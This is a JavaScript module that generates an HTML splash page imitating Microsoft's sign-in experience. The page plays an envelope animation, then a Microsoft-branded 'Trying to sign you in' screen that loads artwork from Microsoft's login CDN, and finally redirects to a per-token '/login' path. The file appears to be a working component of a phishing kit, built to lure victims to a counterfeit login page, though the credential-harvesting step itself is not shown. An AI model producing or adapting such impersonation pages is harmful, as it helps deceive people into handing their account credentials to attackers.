/**
 * MS Splash Page Generator
 * Generates the animated Microsoft envelope splash page with loading transition
 */

function generateMsSplashPage(token) {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            height: 100vh;
            width: 100vw;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
        }

        @media (prefers-color-scheme: dark) {
            body {
                background-color: #1b1b1b;
            }
        }

        /* ===== PHASE 1: Envelope Animation ===== */
        #envelope-phase {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        #envelope-phase.hidden {
            opacity: 0;
            pointer-events: none;
        }

        @keyframes pinchAndRelease {
            0%, 100%, 12.5%, 25%, 35.5%, 50% {
                transform: scale(1, 1) translateY(0);
            }
            30%, 5% {
                transform: scale(.86, 1.1) translateY(-10px);
            }
        }

        @keyframes documentOneScale {
            0%, 100%, 35%, 50% {
                transform: translate(61px, 82px) scale(0, 0) rotateZ(20deg) rotateY(26deg);
            }
            12%, 22% {
                transform: translate(0, 0) scale(1, 1) rotateZ(-18deg) rotateY(0);
            }
        }

        @keyframes documentTwoScale {
            0%, 100%, 33%, 50% {
                transform: translate(44px, 68px) scale(0, 0) rotateZ(20deg) rotateY(26deg);
            }
            15%, 19% {
                transform: translate(0, 0) scale(1, 1) rotateZ(-9deg) rotateY(0);
            }
        }

        @keyframes layersSlideIn {
            0%, 23% {
                transform: translateY(74px) scale(0) rotateX(50deg) rotateZ(45deg);
            }
            100%, 33% {
                transform: translateY(0) scale(1) rotateX(50deg) rotateZ(45deg);
            }
        }

        #container {
            width: 400px;
            height: 400px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            --duration: 3000ms;
            --delay: 0ms;
            --iterationCount: 1;
            --direction: normal;
            --fillMode: forwards;
            --playState: running;
            --easing: ease-in-out;
        }

        .foreground {
            width: 164px;
            height: 200px;
            border-radius: 26px;
            overflow: hidden;
            position: absolute;
            z-index: 100;
            animation: pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .background {
            width: 164px;
            height: 200px;
            border-radius: 26px;
            overflow: hidden;
            position: relative;
            z-index: 20;
            animation: pinchAndRelease var(--duration) var(--easing) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .contents {
            position: absolute;
            bottom: 100px;
            left: 118px;
            width: 164px;
            height: 200px;
            background-color: transparent;
            z-index: 60;
            overflow: hidden;
            animation: pinchAndRelease var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .flap-top-inner-shadow {
            background: radial-gradient(circle, #00217700 54%, #0021778c 100%);
            background-position: -34px -34px;
            background-size: 170px 170px;
            width: 130px;
            height: 130px;
            position: absolute;
            top: 26px;
            left: 17px;
            border-radius: 18px 24px 0 24px;
            transform: rotateX(50deg) rotateZ(45deg);
            transform-style: preserve-3d;
            z-index: 50;
        }

        .flap-top-fill {
            background-color: #28afea;
            width: 130px;
            height: 130px;
            position: absolute;
            top: 26px;
            left: 17px;
            border-radius: 18px 24px 0 24px;
            transform: rotateX(50deg) rotateZ(45deg);
            transform-style: preserve-3d;
            z-index: 30;
        }

        .flap-left {
            width: 200px;
            height: 200px;
            border-radius: 0 38px;
            background-color: #6ce0ff;
            background: radial-gradient(circle, #2cbbf3 0, #87e5ff 100%);
            position: absolute;
            bottom: -80.5px;
            left: -112px;
            transform: rotateX(50deg) rotateZ(45deg);
            z-index: 51;
        }

        .flap-right {
            width: 200px;
            height: 200px;
            border-radius: 0 38px;
            background-color: #0985dc;
            background: linear-gradient(3deg, #0985dc 25%, #3da9fb 58%, #c29dfa 80%, #f4a7f7 100%);
            background-position: 0 0;
            position: absolute;
            bottom: -80.5px;
            right: -112px;
            transform: rotateX(50deg) rotateZ(45deg);
            z-index: 50;
        }

        .background-fill {
            position: absolute;
            width: 100%;
            height: 110px;
            bottom: 0;
            left: 0;
            background: #7bf4ff;
            background: linear-gradient(56deg, #7bf4ff 0, #c29dfa 100%);
        }

        .layer-stack {
            background-color: #3834b9;
            width: 130px;
            height: 130px;
            position: absolute;
            top: 26px;
            left: 17px;
            z-index: 1;
            border-radius: 18px 24px 0 24px;
            transform: rotateX(50deg) rotateZ(45deg);
            transform-style: preserve-3d;
            z-index: 30;
            overflow: hidden;
            animation: layersSlideIn var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .layer-stack::after {
            content: '';
            position: absolute;
            top: -1px;
            left: 0;
            width: 86px;
            height: 158px;
            background-color: #4b6de7;
            border-top-right-radius: 24px;
            z-index: 10;
        }

        .layer-stack::before {
            content: '';
            position: absolute;
            top: -1px;
            left: -10px;
            width: 54px;
            height: 158px;
            background: #5b9ee8;
            background: linear-gradient(344deg, rgb(50 146 234) 30%, #81c2f9 76%, #abb8fa 90%);
            border-radius: 60px;
            z-index: 20;
        }

        .document-one {
            position: absolute;
            width: 130px;
            height: 162px;
            background: #2650bd;
            background: linear-gradient(40deg, rgb(6 103 211) 40%, #7f85f6 100%);
            border-radius: 14px;
            left: 19px;
            top: 18px;
            z-index: 30;
            animation: documentOneScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .document-two {
            position: absolute;
            width: 114px;
            height: 156px;
            background: #abc8e2;
            background: linear-gradient(47deg, #abc8e2 0, #fcefd6 100%);
            border-radius: 14px;
            left: 36px;
            top: 32px;
            z-index: 40;
            box-shadow: -9px -3px 4px -3px rgba(0, 0, 0, .1);
            animation: documentTwoScale var(--duration) var(--easing) var(--delay) var(--iterationCount) var(--direction) var(--fillMode) var(--playState);
        }

        .document-two::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 15px;
            height: 158px;
            background-color: #293bb0;
            border-radius: 24px 0 0 24px;
        }

        /* ===== PHASE 2: Trying to sign in ===== */
        #loading-phase {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.5s ease;
            background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
            background-size: cover;
            background-color: #000000;
            z-index: 10000;
        }

        #loading-phase.visible {
            opacity: 1;
            pointer-events: auto;
        }

        .loading-content {
            background: #1f1e1e;
            border-radius: 9px;
            padding: 44px;
            width: 440px;
            max-width: 90%;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loading-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 32px;
        }

        .loading-logo svg {
            width: 21px;
            height: 21px;
        }

        .loading-logo h2 {
            color: #ffffff;
            font-size: 18px;
            font-weight: 600;
            margin: 0;
        }

        .loading-text {
            font-size: 24px;
            color: #ffffff;
            font-weight: 600;
            margin-bottom: 24px;
            text-align: center;
        }

        .spinner {
            width: 100%;
            height: 20px;
            position: relative;
            margin-bottom: 24px;
        }

        .spinner-dot {
            position: absolute;
            width: 4px;
            height: 4px;
            background-color: #0078d4;
            border-radius: 50%;
            opacity: 0;
            animation: pylon 3s infinite ease-in-out;
        }

        .spinner-dot:nth-child(1) { animation-delay: 0.1s; }
        .spinner-dot:nth-child(2) { animation-delay: 0.2s; }
        .spinner-dot:nth-child(3) { animation-delay: 0.3s; }
        .spinner-dot:nth-child(4) { animation-delay: 0.4s; }
        .spinner-dot:nth-child(5) { animation-delay: 0.5s; }

        @keyframes pylon {
            0% { left: 0%; opacity: 0; animation-timing-function: cubic-bezier(0.15, 0.55, 0.45, 0.85); }
            5% { opacity: 1; }
            45% { left: 45%; opacity: 1; animation-timing-function: cubic-bezier(0.85, 0.15, 0.35, 0.85); }
            55% { left: 55%; opacity: 1; animation-timing-function: cubic-bezier(0.15, 0.55, 0.45, 0.85); }
            95% { left: 100%; opacity: 1; animation-timing-function: cubic-bezier(0.85, 0.15, 0.35, 0.85); }
            100% { left: 100%; opacity: 0; }
        }
    </style>
</head>
<body>
    <!-- Phase 1: Envelope Animation -->
    <div id="envelope-phase">
        <div id="container">
            <div class="foreground">
                <div class="flap-top-inner-shadow"></div>
                <div class="flap-left"></div>
                <div class="flap-right"></div>
            </div>
            <div class="contents">
                <div class="layer-stack"></div>
                <div class="document-two"></div>
                <div class="document-one"></div>
            </div>
            <div class="background">
                <div class="flap-top-fill"></div>
                <div class="background-fill"></div>
            </div>
        </div>
    </div>

    <!-- Phase 2: Trying to sign in -->
    <div id="loading-phase">
        <div class="loading-content">
            <div class="loading-logo">
                <svg viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 0H10V10H0V0Z" fill="#f25022" />
                    <path d="M11 0H21V10H11V0Z" fill="#7fba00" />
                    <path d="M0 11H10V21H0V11Z" fill="#00a4ef" />
                    <path d="M11 11H21V21H11V11Z" fill="#ffb900" />
                </svg>
                <h2>Microsoft</h2>
            </div>
            <div class="loading-text">Trying to sign you in</div>
            <div class="spinner">
                <div class="spinner-dot"></div>
                <div class="spinner-dot"></div>
                <div class="spinner-dot"></div>
                <div class="spinner-dot"></div>
                <div class="spinner-dot"></div>
            </div>
        </div>
    </div>

    <script>
        const envelopePhase = document.getElementById('envelope-phase');
        const loadingPhase = document.getElementById('loading-phase');

        // Phase 1: Show envelope for 3 seconds
        setTimeout(() => {
            envelopePhase.classList.add('hidden');
            loadingPhase.classList.add('visible');
        }, 3000);

        // Phase 2: Show "Trying to sign in" for 2 seconds, then redirect
        setTimeout(() => {
            window.location.href = '/${token}/login';
        }, 5000);
    </script>
</body>
</html>`;
}

module.exports = { generateMsSplashPage };
